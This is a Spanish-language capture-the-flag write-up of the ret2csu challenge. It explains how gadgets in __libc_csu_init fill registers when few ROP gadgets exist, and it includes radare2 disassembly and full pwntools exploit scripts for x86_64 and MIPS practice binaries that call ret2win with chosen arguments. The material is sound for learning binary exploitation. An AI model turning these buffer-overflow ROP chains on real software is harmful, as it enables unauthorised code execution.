# ret2csu

![2025-06-03-140650_762x319_scrot](https://github.com/user-attachments/assets/ac457a1c-a1ee-45f2-a395-3b8f4e7662bb)

## x64_64

### Analisis
En este reto debemos nuevamente llamar a  `ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)`, pero ahora no contamos con muchos gadgets.

"ret2csu" es una tecnica para llenar registros cuando hay una falta de gadgets.

| *Cuando una aplicación se compila dinámicamente (compilada con libc vinculada), contiene una selección de funciones que permiten la vinculación. Estas funciones contienen una selección de gadgets que podemos usar para rellenar los registros para los que no tenemos gadgets, el más importante de los cuales es __libc_csu_init* (Fragmento extraido de [Cybersecurity Notes](https://ir0nstone.gitbook.io/notes/binexp/stack/ret2csu))

 Fragmento extraido de Cybersecurity Notes

Entonces tenemos esta funcion  "__libc_csu_init":
```
[0x00400520]> s sym.__libc_csu_init
[0x00400640]> pdf
            ; DATA XREF from entry0 @ 0x400536(r)
/ 101: sym.__libc_csu_init (int64_t arg1, int64_t arg2, int64_t arg3);
|           ; arg int64_t arg1 @ rdi
|           ; arg int64_t arg2 @ rsi
|           ; arg int64_t arg3 @ rdx
|           0x00400640      4157           push r15
|           0x00400642      4156           push r14
|           0x00400644      4989d7         mov r15, rdx                ; arg3
|           0x00400647      4155           push r13
|           0x00400649      4154           push r12
|           0x0040064b      4c8d259e07..   lea r12, obj.__frame_dummy_init_array_entry ; loc.__init_array_start
|                                                                      ; 0x600df0
|           0x00400652      55             push rbp
|           0x00400653      488d2d9e07..   lea rbp, obj.__do_global_dtors_aux_fini_array_entry ; loc.__init_array_end
|                                                                      ; 0x600df8
|           0x0040065a      53             push rbx
|           0x0040065b      4189fd         mov r13d, edi               ; arg1
|           0x0040065e      4989f6         mov r14, rsi                ; arg2
|           0x00400661      4c29e5         sub rbp, r12
|           0x00400664      4883ec08       sub rsp, 8
|           0x00400668      48c1fd03       sar rbp, 3
|           0x0040066c      e85ffeffff     call sym._init
|           0x00400671      4885ed         test rbp, rbp
|       ,=< 0x00400674      7420           je 0x400696
|       |   0x00400676      31db           xor ebx, ebx
|       |   0x00400678      0f1f840000..   nop dword [rax + rax]
|       |   ; CODE XREF from sym.__libc_csu_init @ 0x400694(x)
|      .--> 0x00400680      4c89fa         mov rdx, r15
|      :|   0x00400683      4c89f6         mov rsi, r14
|      :|   0x00400686      4489ef         mov edi, r13d
|      :|   0x00400689      41ff14dc       call qword [r12 + rbx*8]
|      :|   0x0040068d      4883c301       add rbx, 1
|      :|   0x00400691      4839dd         cmp rbp, rbx
|      `==< 0x00400694      75ea           jne 0x400680
|       |   ; CODE XREF from sym.__libc_csu_init @ 0x400674(x)
|       `-> 0x00400696      4883c408       add rsp, 8
|           0x0040069a      5b             pop rbx
|           0x0040069b      5d             pop rbp
|           0x0040069c      415c           pop r12
|           0x0040069e      415d           pop r13
|           0x004006a0      415e           pop r14
|           0x004006a2      415f           pop r15
\           0x004006a4      c3             ret
```

Hay dos gadgets relevantes. En `0x00400696` podemos hacer `pop` a 6 registros y en `0x00400680` podemos controlar `rdx`, `rsi` y la parte baja de `rdi`, `edi`.

Es la unica forma que tenemos de asignar un valor a `rdx`, pero esta remina en `call qword [r12 + rbx*8]`, que llama a lo direccion que este almacenada en la direccion "[r12 + rbx*8]".

Ademas hay un `cmp rbp, rbx` que hay que sobrepasar y al final se extraen 7 valores de la pila antes de retornar.

### ret2csu

Primero llamamos a `0x00400696` para rellenar los registros.

`r13` contendra cualquier cosa porque al final haremos un `pop_rdi` para llenar `rdi` correctamente; `r14` contendra el valor que queremos para `rsi`: "0xcafebabecafebabe"; y `r15` contendra el valor que queremos para `rdx`: "0xd00df00dd00df00d".

En cuanto al resto de los registros tenemos la seccion `.dynamic` que contiene punteros a funciones como por ejemplo `_fini` que es perfecta porque praticamente no hace nada y solo retorna:
```
[0x00400520]> s sym._fini
[0x004006b4]> pdf
            ;-- section..fini:
/ 9: sym._fini ();
| rg: 0 (vars 0, args 0)
| bp: 0 (vars 0, args 0)
| sp: 0 (vars 0, args 0)
|           0x004006b4      4883ec08       sub rsp, 8                  ; [14] -r-x section size 9 named .fini
|           0x004006b8      4883c408       add rsp, 8
\           0x004006bc      c3             ret
```

```
[0x004006b4]>  s section..dynamic
[0x00600e00]> pd 10
            ;-- section..dynamic:
            ;-- segment.DYNAMIC:
            ;-- _DYNAMIC:
            0x00600e00      .qword 0x0000000000000001                  ; [20] -rw- section size 496 named .dynamic
            0x00600e08      .qword 0x0000000000000001
            0x00600e10      .qword 0x0000000000000001
            0x00600e18      .qword 0x0000000000000038
            0x00600e20      .qword 0x000000000000001d
            0x00600e28      .qword 0x0000000000000078
            0x00600e30      .qword 0x000000000000000c
            0x00600e38      .qword 0x00000000004004d0 ; section..init ; sym._init
            0x00600e40      .qword 0x000000000000000d
            0x00600e48      .qword 0x00000000004006b4 ; section..fini ; sym._fini
```

Queremos que `[r12 + rbx*8]` contenga la direccion de `.dynamic` que apunta a esa funcion, asi que hacemos `rbx`=0 y `r12`=0x00600e48.

Finalmente hacemos `rbp`=1 para superar `cmp rbp, rbx`.

Al final la ROP chain queda asi:
- offset
- pop_6
- call_r12_rbx
- pop_rdi
- ret2win

``` python
#!/usr/bin/env python3
from pwn import *

elf = ELF("./ret2csu")
lib = ELF("./libret2csu.so")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"

pop_rdi =  0x004006a3   # pop rdi; ret
pop6 =  0x0040069a      # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
call =  0x00400680      # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword [r12 + rbx*8] ...
dynamic = 0x600e48      # segment.dynamic pointer to _fini

payload = b"A" * 40
payload += p64(pop6) 
payload += p64(0)                                                       # rbx
payload += p64(1)                                                       # rbp
payload += p64(dynamic)                                                 # r12
payload += p64(0) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d)   # r13, r14, r15
# call libcsu_fini
payload += p64(call)             
# trash to fill add rsp 8; pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
payload += b"A" * 56
# call ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
payload += p64(pop_rdi) + p64(0xdeadbeefdeadbeef)
payload += p64(elf.plt.ret2win)
 
io = process("./ret2csu")
io.send(payload)
io.interactive()
```

## MIPS

En este es hasta más fácil, tenemos un gadget que rellena los registros $s0-$s5 y otro que rellena $a1 y $a2 con $s4 y $s5 respectivamente, salta a $r9 y si $a1 != $a2, carga $s3 en $a0 y vuelve a saltar a $r9.

```py
from pwn import *
#io = process("qemu-mipsel -g 1024 -L /usr/mipsel-linux-gnu write4_mipsel",shell=True)
io = process("qemu-mipsel -L /usr/mipsel-linux-gnu ret2csu_mipsel",shell=True)
"""
           0x004009c0      3400bf8f       lw ra, (var_34h)
           0x004009c4      3000b58f       lw s5, (var_30h)
           0x004009c8      2c00b48f       lw s4, (var_2ch)
           0x004009cc      2800b38f       lw s3, (var_28h)
           0x004009d0      2400b28f       lw s2, (var_24h)
           0x004009d4      2000b18f       lw s1, (var_20h)
           0x004009d8      1c00b08f       lw s0, (var_1ch)
           0x004009dc      0800e003       jr ra
"""
load_s_regs = 0x004009c0

"""
      0x004009a0      0000198e       lw t9, (s0)                 
      0x004009a4      01003126       addiu s1, s1, 1
      0x004009a8      2530a002       move a2, s5
      0x004009ac      25288002       move a1, s4
      0x004009b0      09f82003       jalr t9
      0x004009b4      25206002       move a0, s3
      0x004009b8      f9ff5116       bne s2, s1, 0x4009a0
"""
win_gadget = 0x004009a0 

ret2win_GOT_JMP_SLOT = 0x00411058

payload = b""
payload += b"A"*36
payload += p32(load_s_regs)
payload += p32(0) * 7                                   # offset
payload += p32(ret2win_GOT_JMP_SLOT)                    # $s0
payload += p32(0)                                       # $s1
payload += p32(0)                                       # $s2
payload += p32(0xdeadbeef)                              # $s3
payload += p32(0xcafebabe)                              # $s4
payload += p32(0xd00df00d)                              # $s5
payload += p32(win_gadget)                              # $ra

io.send(payload)
io.interactive()
```

